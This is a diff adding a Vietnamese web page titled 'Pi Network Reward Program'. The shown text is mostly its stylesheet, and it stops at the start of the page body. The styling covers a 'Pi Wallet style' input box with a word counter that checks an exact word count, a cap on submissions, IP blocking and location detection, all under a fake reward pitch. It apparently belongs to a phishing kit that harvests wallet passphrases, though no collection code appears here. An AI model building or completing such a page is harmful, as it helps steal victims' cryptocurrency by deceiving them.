@@ -1,0 +1,2650 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chương Trình Thưởng Pi Network</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --pi-purple: #693988;
+            --pi-purple-light: #693988;
+            --pi-purple-dark: #693988;
+            --pi-gold: #f8c056;
+            --pi-gold-light: #ffd78c;
+            --pi-gold-dark: #e6a938;
+        }
+        
+        /* Dark mode styles */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-primary: #1a0e24;
+                --bg-secondary: #2a1052;
+                --text-primary: #ffffff;
+                --text-secondary: #e0d0ff;
+                --card-bg: rgba(30, 12, 48, 0.85);
+                --input-bg: rgba(30, 12, 48, 0.5);
+            }
+        }
+        
+        /* Light mode styles */
+        @media (prefers-color-scheme: light) {
+            :root {
+                --bg-primary: #f5efff;
+                --bg-secondary: #eee6ff;
+                --text-primary: #333333;
+                --text-secondary: #666666;
+                --card-bg: rgba(255, 255, 255, 0.85);
+                --input-bg: rgba(255, 255, 255, 0.8);
+            }
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            will-change: transform; /* Optimize for animations */
+        }
+        
+        .pi-header {
+            background-color: var(--pi-purple);
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            height: 64px;
+            z-index: 50;
+            box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
+        }
+        
+        .pi-header-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            position: relative;
+        }
+        
+        .header-back-btn {
+            position: absolute;
+            left: 0;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: transform 0.2s;
+        }
+        
+        .header-back-btn:hover {
+            transform: translateX(-2px);
+        }
+        
+        .header-dropdown-btn {
+            position: absolute;
+            right: 0;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: transform 0.2s;
+        }
+        
+        .header-dropdown-btn:hover {
+            transform: translateY(2px);
+        }
+        
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--pi-purple);
+            margin-right: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .wallet-icon::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0) 40%,
+                rgba(255, 255, 255, 0.4) 50%,
+                rgba(255, 255, 255, 0) 60%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shineIcon 3s infinite;
+        }
+        
+        .wallet-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+        
+        .pi-coin-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--pi-purple);
+            margin-left: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pi-coin-icon::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0) 40%,
+                rgba(255, 255, 255, 0.4) 50%,
+                rgba(255, 255, 255, 0) 60%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shineIcon 3s infinite;
+            animation-delay: 1s;
+        }
+        
+        /* Premium background elements - simplified */
+        .premium-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -10;
+            overflow: hidden;
+            pointer-events: none; /* prevent interaction with background */
+        }
+        
+        /* Animated gradient - simplified */
+        .animated-gradient {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(154, 83, 198, 0.08) 0%, transparent 60%),
+                radial-gradient(circle at 80% 20%, rgba(154, 83, 198, 0.08) 0%, transparent 50%);
+            opacity: 0.7; /* Reduced opacity */
+        }
+        
+        /* Light streaks - simplified and reduced */
+        .light-streak {
+            position: absolute;
+            height: 1px;
+            width: 200px;
+            background: linear-gradient(90deg, transparent, rgba(154, 83, 198, 0.5), transparent);
+            border-radius: 100%;
+            opacity: 0;
+            animation: lightStreak 12s linear infinite; /* Slower animation */
+            will-change: transform, opacity; /* Optimize animation */
+        }
+        
+        /* Moving waves - retained but simplified */
+        .wave-container {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            opacity: 0.2; /* Reduced opacity */
+        }
+        
+        .wave {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            border-radius: 40%;
+            opacity: 0.2;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: waveRotate 60s linear infinite; /* Slowed down */
+            will-change: transform; /* Optimize animation */
+        }
+        
+        .wave1 {
+            border: 1px solid rgba(154, 83, 198, 0.3);
+            animation-duration: 60s; /* Slowed down */
+        }
+        
+        .wave2 {
+            border: 1px solid rgba(248, 192, 86, 0.3);
+            animation-duration: 50s; /* Slowed down */
+            animation-direction: reverse;
+        }
+        
+        .wave3 {
+            border: 1px solid rgba(154, 83, 198, 0.2);
+            animation-duration: 70s; /* Slowed down */
+        }
+        
+        /* Stars - reduced */
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            filter: blur(1px);
+            opacity: 0.4;
+            animation: twinkle 4s infinite ease-in-out;
+        }
+        
+        /* Star with single point */
+        .star-single {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background-color: white;
+            border-radius: 50%;
+            filter: blur(0.5px);
+            opacity: 0.8;
+            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
+            animation: twinkleStar 3s infinite ease-in-out;
+        }
+
+        /* Shooting star - fixed direction */
+        .shooting-star {
+            position: absolute;
+            height: 2px;
+            background: linear-gradient(to right, rgba(255, 255, 255, 0), rgba(255, 255, 255, 1) 50%, rgba(255, 255, 255, 0));
+            opacity: 0;
+            transform-origin: left center;
+            animation: shootingStar 6s linear infinite;
+            will-change: opacity, transform;
+        }
+
+        /* Pi coins - reduced, simplified */
+        .premium-coin {
+            position: absolute;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: var(--pi-purple);
+            z-index: -1;
+            transform-style: preserve-3d;
+            will-change: transform; /* Optimize animation */
+        }
+        
+        .coin-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            text-align: center;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+            animation: coinRotate 20s infinite linear; /* Slowed down */
+        }
+        
+        .coin-front, .coin-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            backface-visibility: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        .coin-front {
+            background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
+            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
+        }
+        
+        .coin-back {
+            background: radial-gradient(circle at 30% 30%, var(--pi-gold-dark), var(--pi-gold));
+            transform: rotateY(180deg);
+            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
+        }
+        
+        /* Floating particles - reduced */
+        .particle {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background-color: rgba(154, 83, 198, 0.2);
+            border-radius: 50%;
+            filter: blur(1px);
+            animation: floatParticle 15s infinite linear;
+            will-change: transform; /* Optimize animation */
+        }
+        
+        /* Feature card with enhanced wave effect */
+        .feature-card {
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .feature-card-wave {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(
+                ellipse at center,
+                rgba(105, 57, 136, 0.2) 0%,
+                rgba(105, 57, 136, 0.1) 25%,
+                rgba(105, 57, 136, 0) 70%
+            );
+            opacity: 0;
+            border-radius: 50%;
+            transform: translate(-25%, -25%) scale(0.1);
+            animation: cardWave 4s infinite ease-out;
+            pointer-events: none;
+        }
+        
+        /* Shiny wave effect for feature icons */
+        .feature-icon {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-icon::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -100%;
+            width: 70%;
+            height: 200%;
+            background: linear-gradient(
+                to right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shinyWave 3s infinite ease-in-out;
+            pointer-events: none;
+        }
+
+        /* Confetti elements for success animation */
+        .confetti-container {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            pointer-events: none;
+            overflow: hidden;
+            display: none;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: var(--pi-gold);
+            opacity: 0;
+        }
+
+        /* Square confetti */
+        .confetti-square {
+            background-color: var(--pi-purple);
+        }
+
+        /* Circle confetti */
+        .confetti-circle {
+            border-radius: 50%;
+            background-color: var(--pi-gold);
+        }
+
+        /* Triangle confetti */
+        .confetti-triangle {
+            width: 0;
+            height: 0;
+            background-color: transparent;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-bottom: 10px solid var(--pi-purple-light);
+        }
+        
+        /* Page container and transitions */
+        .page-container {
+            width: 100%;
+            max-width: 100vw;
+            overflow-x: hidden;
+            min-height: calc(100vh - 64px);
+            position: relative;
+        }
+        
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: calc(100vh - 64px);
+            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            background-color: transparent;
+            z-index: 10;
+            will-change: transform, opacity; /* Optimize animation */
+        }
+        
+        .page-active {
+            transform: translateX(0);
+            opacity: 1;
+            z-index: 11;
+        }
+        
+        .page-inactive-right {
+            transform: translateX(100%);
+            opacity: 0;
+            z-index: 9;
+            pointer-events: none;
+        }
+        
+        .page-inactive-left {
+            transform: translateX(-100%);
+            opacity: 0;
+            z-index: 9;
+            pointer-events: none;
+        }
+        
+        /* Premium cards */
+        .card {
+            background-color: var(--card-bg);
+            backdrop-filter: blur(15px);
+            border-radius: 1.2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
+            pointer-events: none;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+        }
+        
+        /* Premium buttons */
+        .btn-primary {
+            background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
+            color: white;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: 0.9rem 2rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            border: none;
+            outline: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+        
+        .btn-secondary {
+            background: rgba(122, 53, 164, 0.1);
+            color: var(--pi-purple);
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: 0.75rem 1.5rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(122, 53, 164, 0.2);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(122, 53, 164, 0.15);
+            transform: translateY(-2px);
+        }
+        
+        /* Premium reward cards - optimized */
+        .reward-card {
+            position: relative;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+            border-top: 3px solid transparent;
+            background: linear-gradient(var(--card-bg), var(--card-bg)) padding-box,
+                       linear-gradient(90deg, var(--pi-purple), var(--pi-gold)) border-box;
+        }
+        
+        .reward-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+        }
+        
+        .reward-amount {
+            color: var(--pi-purple);
+            font-weight: bold;
+            font-size: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .reward-amount::before {
+            content: "π";
+            font-size: 2.2rem;
+            margin-right: 0.2rem;
+        }
+        
+        .reward-amount::after {
+            content: '';
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            background: radial-gradient(circle, rgba(248, 192, 86, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: -1;
+        }
+        
+        /* Premium progress bar - optimized */
+        .progress-bar {
+            height: 8px;
+            border-radius: 10px;
+            background: rgba(122, 53, 164, 0.1);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            border-radius: 10px;
+            background: linear-gradient(90deg, var(--pi-purple), var(--pi-purple-light));
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Premium feature icons - optimized */
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
+            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-icon i {
+            font-size: 2rem;
+            color: white;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Pi Wallet style form */
+        .pi-wallet-style {
+            margin: 0 auto;
+            max-width: 500px;
+            padding: 0 20px;
+        }
+
+        .pi-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 1.7rem;
+        }
+
+        .pi-input-container {
+            margin-bottom: 1.3rem;
+            border-radius: 16px;
+            height: 250px; /* Tăng chiều cao */
+            overflow: hidden;
+            background: var(--input-bg);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            max-width: 1000px; /* Điều chỉnh độ rộng tại đây */
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .pi-input {
+            width: 100%;
+            padding: 24px;
+            height: 250px; /* Tăng chiều cao */
+            resize: none; 
+            background: transparent;
+            border: none;
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            outline: none;
+            vertical-align: top;
+            text-align: left;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            white-space: pre-wrap;
+            display: block;
+            align-self: flex-start;
+        }
+
+        .pi-button {
+            width: 100%;
+            padding: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            text-align: center;
+            border-radius: 16px;
+            margin-bottom: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .pi-button-primary {
+            background-color: var(--pi-purple);
+            color: white;
+            border: none;
+            box-shadow: 0 6px 12px rgba(122, 53, 164, 0.25);
+        }
+
+        .pi-button-primary:hover {
+            background-color: var(--pi-purple-light);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
+        }
+
+        .pi-button-primary:disabled {
+            background-color: #a5a5a5;
+            transform: none;
+            cursor: not-allowed;
+            box-shadow: none;
+            opacity: 0.7;
+        }
+
+        .pi-button-secondary {
+            background-color: transparent;
+            color: var(--pi-purple);
+            border: 1px solid var(--pi-purple);
+        }
+
+        .pi-button-secondary:hover {
+            background-color: rgba(122, 53, 164, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .pi-info-text {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            margin-top: 2rem;
+            text-align: left; /* Căn lề trái */
+            word-wrap: break-word; /* Cho phép xuống dòng khi cần */
+            white-space: normal; /* Hiển thị toàn bộ nội dung */
+            width: 100%; /* Đảm bảo hiển thị hết chiều ngang */
+        }
+
+        .pi-link {
+            color: #3d9dff;
+            text-decoration: none;
+        }
+
+        /* Scroll animations - optimized */
+        .animate-on-scroll {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+            will-change: opacity, transform; /* Optimize animation */
+        }
+
+        .animate-on-scroll.animated {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .animate-fade-in {
+            opacity: 0;
+            transition: opacity 1s ease;
+            will-change: opacity; /* Optimize animation */
+        }
+
+        .animate-fade-in.animated {
+            opacity: 1;
+        }
+
+        /* Simplified about section illustration */
+        .about-illustration {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 2rem;
+            position: relative;
+        }
+
+        .about-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(154, 83, 198, 0.1), rgba(154, 83, 198, 0.2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .about-circle::before {
+            content: '';
+            position: absolute;
+            width: 90%;
+            height: 90%;
+            border-radius: 50%;
+            border: 2px dashed rgba(154, 83, 198, 0.3);
+        }
+
+        .about-icon {
+            font-size: 4rem;
+            color: var(--pi-purple);
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .loading-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+        
+        .loading-spinner::before, 
+        .loading-spinner::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--pi-purple);
+            animation: spin 1.5s linear infinite;
+            box-shadow: 0 0 10px rgba(122, 53, 164, 0.3);
+        }
+        
+        .loading-spinner::after {
+            border-top-color: transparent;
+            border-bottom-color: var(--pi-gold);
+            animation-duration: 1s;
+        }
+        
+        .loading-spinner-label {
+            position: absolute;
+            top: 120%;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        /* Simplified explosion particles */
+        .surprise-container {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .surprise-trigger.active .explosion-particle {
+            animation: explode 1s forwards;
+        }
+
+        .explosion-particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--pi-gold);
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Simplified 3D effect for better performance */
+        .tilt-card {
+            transform-style: preserve-3d;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .tilt-card:hover {
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Certificate badge */
+        .certificate {
+            position: relative;
+            padding: 1.5rem;
+            border-radius: 1rem;
+            background: linear-gradient(135deg, rgba(248, 192, 86, 0.1), rgba(154, 83, 198, 0.1));
+            border: 1px dashed rgba(248, 192, 86, 0.3);
+            margin-top: 2rem;
+        }
+
+        .certificate-icon {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .certificate-icon i {
+            color: white;
+            font-size: 1.2rem;
+        }
+
+        .certificate-title {
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            margin-top: 0.5rem;
+        }
+
+        .certificate-text {
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        /* Floating icons - reduced */
+        .floating-icon {
+            position: absolute;
+            z-index: -1;
+            opacity: 0.5;
+        }
+
+        /* Word counter styles */
+        .word-counter {
+            text-align: right;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+            padding-right: 0.5rem;
+            display: none; /* Hidden by default, only shown for invalid count */
+        }
+
+        .word-counter.invalid {
+            color: #F44336;
+            font-weight: 600;
+            display: block; /* Show only when invalid */
+        }
+
+        /* Validation message */
+        .validation-message {
+            color: #F44336;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Visual indicator for input container */
+        .pi-input-container.valid-input {
+            border: 2px solid #4CAF50;
+        }
+
+        .pi-input-container.invalid-input {
+            border: 2px solid #F44336;
+        }
+
+        /* Limited submissions message */
+        .limit-message {
+            background-color: #FFF3CD;
+            color: #856404;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #FFEEBA;
+            font-weight: 500;
+            display: none;
+        }
+
+        .error-message {
+            background-color: #F8D7DA;
+            color: #721C24;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 1px solid #F5C6CB;
+            font-weight: 500;
+            display: none;
+        }
+
+        /* Language chooser */
+        .language-chooser {
+            position: absolute;
+            top: 16px;
+            right: 80px;
+            display: flex;
+            align-items: center;
+            z-index: 60;
+        }
+        
+        .language-option {
+            display: flex;
+            align-items: center;
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.7);
+            transition: all 0.2s ease;
+            margin-left: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .language-option:hover {
+            color: white;
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .language-option.active {
+            color: white;
+            font-weight: bold;
+            background-color: rgba(255, 255, 255, 0.15);
+        }
+        
+        .language-option img {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+            border-radius: 2px;
+        }
+
+        /* Blocked IP notification */
+        .ip-blocked-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.85);
+            color: white;
+            padding: 30px;
+            border-radius: 12px;
+            z-index: 2000;
+            max-width: 90%;
+            width: 420px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            display: none;
+        }
+        
+        .ip-blocked-message h3 {
+            color: #F44336;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .ip-blocked-message p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .ip-blocked-message button {
+            background-color: #F44336;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .ip-blocked-message button:hover {
+            background-color: #d32f2f;
+            transform: translateY(-2px);
+        }
+
+        /* IP location detection notification */
+        .location-detected {
+            background-color: rgba(255, 255, 255, 0.97);
+            color: #333;
+            padding: 10px 15px;
+            border-radius: 50px;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            max-width: 90%;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+        }
+        
+        .location-detected.visible {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+            pointer-events: all;
+        }
+        
+        .location-detected i {
+            color: var(--pi-purple);
+            margin-right: 8px;
+        }
+        
+        .location-detected .country-flag {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            margin-right: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        #formPage {
+            background-color: white !important;
+        }
+
+        #formPage .pi-wallet-style {
+            background-color: white;
+        }
+
+        #formPage .pi-title {
+            color: #333;
+        }
+
+        #formPage .pi-info-text {
+            color: #555;
+        }
+
+        /* Đảm bảo input vẫn hiển thị tốt trên nền trắng */
+        #formPage .pi-input-container {
+            background: #f8f8f8;
+            border: 1px solid #ddd;
+        }
+
+        #formPage .pi-input {
+            color: #333;
+        }
+
+        #formPage .limit-message {
+            background-color: #FFF3CD;
+            color: #856404;
+        }
+
+        #formPage .error-message {
+            background-color: #F8D7DA;
+            color: #721C24;
+        }
+
+        /* Optimized Animations */
+        @keyframes shineIcon {
+            0% { transform: rotate(30deg) translateX(-100%); }
+            100% { transform: rotate(30deg) translateX(100%); }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes twinkleStar {
+            0%, 100% { 
+                opacity: 0.4;
+                transform: scale(1);
+            }
+            50% { 
+                opacity: 0.8;
+                transform: scale(1.2);
+            }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes floatParticle {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0); }
+        }
+        
+        @keyframes waveRotate {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        @keyframes coinRotate {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
+        }
+
+        @keyframes explode {
+            0% {
+                opacity: 1;
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(var(--tx), var(--ty)) scale(0);
+            }
+        }
+
+        @keyframes lightStreak {
+            0%, 100% {
+                opacity: 0;
+                transform: rotate(45deg) translateX(-100px);
+            }
+            10%, 90% {
+                opacity: 0.2;
+            }
+            50% {
+                transform: rotate(45deg) translateX(calc(100vw + 100px));
+            }
+        }
+
+        /* Fixed shooting star animation with proper direction and fading */
+        @keyframes shootingStar {
+            0% {
+                opacity: 0;
+                transform: translateX(0) translateY(0);
+            }
+            10%, 15% {
+                opacity: 0.3;
+            }
+            45% {
+                opacity: 1;
+            }
+            70% {
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0;
+                transform: translateX(300px) translateY(300px);
+            }
+        }
+
+        /* Card wave animation */
+        @keyframes cardWave {
+            0%, 100% {
+                opacity: 0;
+                transform: translate(-25%, -25%) scale(0.1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: translate(-25%, -25%) scale(1.8);
+            }
+        }
+
+        /* Confetti animation */
+        @keyframes confettiFall {
+            0% {
+                opacity: 1;
+                transform: translateY(-10vh) rotate(0deg);
+            }
+            100% {
+                opacity: 0.2;
+                transform: translateY(100vh) rotate(720deg);
+            }
+        }
+        
+        /* Shiny wave animation for feature icons */
+        @keyframes shinyWave {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 150%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Premium Background Elements - With optimized shooting stars -->
+    <div class="premium-bg">
+        <div class="animated-gradient"></div>
+        <div class="wave-container">
+            <div class="wave wave1"></div>
+            <div class="wave wave2"></div>
+            <div class="wave wave3"></div>
+        </div>
+        <div id="starsContainer"></div>
+        <div id="singleStarsContainer"></div>
+        <div id="shootingStarsContainer"></div>
+        <div id="particlesContainer"></div>
+        <div id="coinsContainer"></div>
+        <div id="lightStreaksContainer"></div>
+    </div>
+    
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-spinner">
+            <div class="loading-spinner-label" data-vi="Đang xử lý..." data-en="Processing...">Đang xử lý...</div>
+        </div>
+    </div>
+
+    <!-- Confetti container for success celebration -->
+    <div id="confettiContainer" class="confetti-container"></div>
+
+    <!-- IP Blocked Message -->
+    <div id="ipBlockedMessage" class="ip-blocked-message">
